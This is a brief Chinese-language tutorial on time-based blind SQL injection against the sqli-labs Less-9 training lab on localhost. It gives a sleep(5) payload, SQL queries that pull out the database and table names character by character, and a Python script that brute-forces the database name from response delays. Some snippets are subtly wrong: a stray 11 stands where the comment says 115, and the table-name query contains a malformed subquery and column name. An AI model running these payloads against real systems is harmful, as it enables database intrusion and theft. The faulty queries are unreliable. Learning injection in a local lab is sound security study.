payload:?id=1'and+sleep(5)--+

五秒后返回存在时间盲注。



确定数据库第一位字母：

```javascript
#if数据库第一位字符的ascii=115时 sleep（5）
select * from users where id='1' 
and IF(ascii(substr(database(),1,1))=11,sleep(5),1);
```

当数据库名的第一位的ascii=115时 sleep(5)



已知数据库名为security:

```javascript
select * from users where id='1' 
and IF(ascii(substr(select table_name from 
information_schema.tables where table.schema='security' 
limit 0,1),1,1))=101,sleep(5),1);
```



盲注脚本：

```javascript
# coding=utf-8
# python3
# heibai
import requests

dic = "qwertyuioplkjhgfdsazxcvbnm0123456789,_@!#$%^&*()_+=<>?:\"|';/."
url = "http://127.0.0.1/vuln/sqli-labs/Less-9/?id=1'+and+"
string = ''
for i in range(1, 100):
    for j in dic:
        id = "if(ascii(substr(database(),{0},1))={1},sleep(5),1)--+".format(i, ord(j))

        ctf = requests.get(url + id)
        time = ctf.elapsed.seconds
        if time > 3:
            string += j
            print(string)
            break
print(string)
```

